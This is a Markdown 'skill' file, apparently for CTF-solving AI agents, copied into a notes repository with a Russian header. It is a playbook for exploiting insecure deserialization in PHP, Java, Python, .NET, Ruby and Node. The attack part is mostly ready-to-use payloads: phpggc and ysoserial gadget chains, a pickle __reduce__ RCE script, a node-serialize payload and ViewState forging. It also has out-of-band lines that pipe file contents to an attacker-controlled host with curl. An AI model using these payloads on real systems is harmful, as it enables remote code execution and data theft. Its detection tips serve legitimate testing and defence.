# Insecure Deserialization

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/insecure-deserialization.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/insecure-deserialization.md)

---

---
name: insecure-deserialization
category: web
triggers: [deserialization, unserialize, pickle, ysoserial, "ysoserial.net", phpggc, phar, "gadget chain", viewstate, "__VIEWSTATE", "rO0AB", "aced0005", "O:8:", "__wakeup", "__destruct", marshal, "readObject", "BinaryFormatter", "pickle.loads", "yaml.load", serialized]
tools: [ysoserial, "ysoserial.net", phpggc, "gadgetinspector", "pickle", burp]
priority: high
description: Achieve RCE/file access by tampering with serialized objects across PHP, Python, Java, .NET, and Ruby using magic methods and gadget chains.
---
# Insecure Deserialization

## Trigger context
- Serialized blobs in cookies, hidden fields, params, headers, message queues, cache, uploads.
- Format fingerprints (identify language first):
  - **PHP**: `O:8:"stdClass":...`, `a:2:{...}`, base64 of it. Also any `phar://` file op.
  - **Java**: hex `AC ED 00 05` / base64 `rO0AB...`.
  - **Python pickle**: `\x80\x04` / `\x80\x05` (protocol byte), or base64 `gAS...`/`gAR...`.
  - **.NET**: `AAEAAAD/////` (BinaryFormatter), or ASP.NET `__VIEWSTATE`.
  - **Ruby**: `\x04\x08` (Marshal); YAML `!ruby/object`.
- Signals: app "remembers" objects across requests, `Content-Type` hints, deserialization stack traces.

## Objective
RCE via gadget chains, or lesser wins: object injection to change auth state, file write/read, SSRF, DoS. In CTF, RCE-to-flag is the goal.

## Methodology (decision tree)
1. Identify language/format from the fingerprint above.
2. Confirm the blob is deserialized untrusted (modify a byte → different behavior/error).
3. Check for MAC/signature (Java sometimes; .NET ViewState almost always). Signed → need the key (see Branching).
4. Enumerate available gadget libraries (source, `composer.lock`, `.jar` list, `pip freeze`, DLLs).
5. Generate a payload with the matching tool for a present gadget chain.
6. Deliver; observe RCE (OOB ping first, then flag read).
7. No known gadget → hand-craft using app's own classes with dangerous `__destruct`/`__wakeup`/`readObject`/`__reduce__`.

## Commands & payloads
```bash
# --- PHP ---
# Hand-crafted object injection (app class with __wakeup/__destruct sink):
# O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
# phpggc: generate gadget for a known library (Monolog, Laravel, Guzzle, Symfony...)
phpggc -l                                   # list chains
phpggc Monolog/RCE1 system 'id' | base64 -w0
phpggc -p phar Monolog/RCE1 system 'id' -o evil.phar   # phar: trigger via any file op on phar://evil.phar
# phar trigger (no unserialize call needed): include/file_exists/getimagesize('phar://evil.phar')

# --- Python pickle ---
python3 - <<'PY'
import pickle, base64, os
class E:
    def __reduce__(self): return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
PY
# yaml.load (unsafe) RCE:  !!python/object/apply:os.system ['id']

# --- Java ---
java -jar ysoserial.jar CommonsCollections6 'curl OAST/`id`' | base64 -w0
java -jar ysoserial.jar URLDNS http://OAST-ID.oastify.com   # detection: no RCE, just DNS = confirms deser
# Common chains: CommonsCollections1-7, Groovy1, Spring1/2, Hibernate1, Jdk7u21
# Find viable chain by libs on classpath; gadgetinspector to discover new ones.

# --- .NET ---
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c "ping OAST"
# ASP.NET ViewState (need machineKey / validation+decryption keys):
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --generator=<__VIEWSTATEGENERATOR> --validationkey=<KEY> --validationalg=SHA1 -c "cmd"

# --- Ruby ---
# Universal Marshal gadget (see PayloadsAllTheThings) for Ruby 2.x/3.x RCE.
```

```
# Format fingerprint quick table (decode base64 first if needed):
PHP      O:8:"..."  / a:N:{...}          magic methods: __wakeup __destruct __toString
Java     AC ED 00 05   (b64 rO0AB)       sinks: readObject / readResolve
Python   80 04 / 80 05 (b64 gAS/gAR)     __reduce__ -> (callable, args)
.NET     00 01 00 00 00 FF FF FF FF      (b64 AAEAAAD/////)  BinaryFormatter/LosFormatter
.NET VS  __VIEWSTATE=  + __VIEWSTATEGENERATOR
Ruby     04 08                            Marshal.load ;  YAML !ruby/object
Node     usually JSON -> look for _$$ND_FUNC$$_ (node-serialize) or funcster
```
```bash
# node-serialize (node-serialize <=0.0.4) RCE payload:
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',(e,o)=>console.log(o))}()"}
# Ruby (Universal Marshal gadget) / Rails cookie: needs secret_key_base -> then Marshal RCE.
```

## Branching logic
- **Signed/MAC'd blob (Java `SignedObject`, .NET ViewState)** → find the key: leaked `web.config` machineKey (try [file-inclusion-lfi-rfi](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-inclusion-lfi-rfi.md)/[file-upload](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-upload.md)), default/blank keys, or Blacklist3r/known-key lists. No key → look for a `EnableViewStateMac=false` endpoint.
- **No known gadget on classpath** → enumerate exact library versions; run `gadgetinspector` on the jars; or exploit the app's own magic methods.
- **PHP `unserialize` not directly reachable** → phar deserialization: upload a polyglot phar (see [file-upload](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-upload.md)) and trigger any filesystem function on `phar://`.
- **Pickle blocked but YAML/Marshal/`jsonpickle` present** → pivot to that sink.
- **RCE hard, but object injection possible** → change privilege/role fields, path fields (LFI/write), or trigger SSRF/SQLi via injected properties.
- **Blind (no output)** → use `URLDNS` (Java) / OOB command (`curl OAST`) to confirm, then exfil flag OOB (`curl OAST/$(cat /flag|base64)`).

## Detection tips
- Base64-decode every cookie/hidden field/param; look for the fingerprints above (a leading `O:`, `rO0`, `gAS`, `AAEAAAD`).
- Flip a single byte and resend: a stack trace mentioning `ObjectInputStream`, `unserialize`, `pickle`, `BinaryFormatter`, or `readObject` confirms a deserialization sink.
- Grep source (if available) for sinks: `unserialize(`, `pickle.loads`, `yaml.load` (not `safe_load`), `ObjectInputStream`, `BinaryFormatter`, `readObject`, `Marshal.load`, `node-serialize`.
- ViewState: check for `__VIEWSTATE` and whether `__VIEWSTATEGENERATOR` is present (MAC likely on) vs. absent.

## Common pitfalls
- Wrong gadget for the classpath = silent failure; match library + version, don't spray blindly.
- Base64/URL-encode the raw bytes exactly as the app expects (cookie vs. body vs. multipart differ).
- Java `URLDNS` proves deserialization but NOT RCE — still need a real gadget for code exec.
- phar magic works only if a file function receives an attacker-controlled `phar://` path; PHP 8 tightened this — check version.
- .NET ViewState RCE needs BOTH validation and (if encrypted) decryption keys plus the generator value.
- Newlines/null bytes in serialized blobs get mangled by some transports — verify byte-for-byte delivery.

## Proof / verification
- OOB DNS/HTTP hit from the target (URLDNS or `curl OAST`).
- Command output (`id`, `hostname`) reflected or exfiltrated.
- Flag read: `curl OAST/$(base64 /flag)` and decode from your log.

## Cross-references
[file-upload](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-upload.md) · [file-inclusion-lfi-rfi](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--file-inclusion-lfi-rfi.md) · [ssrf](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--ssrf.md) · [xxe](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--xxe.md) · [auth-jwt-session](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--auth-jwt-session.md)

## Credible sources
- https://portswigger.net/web-security/deserialization
- https://github.com/frohoff/ysoserial
- https://github.com/ambionics/phpggc
- https://github.com/pwntester/ysoserial.net
- https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/
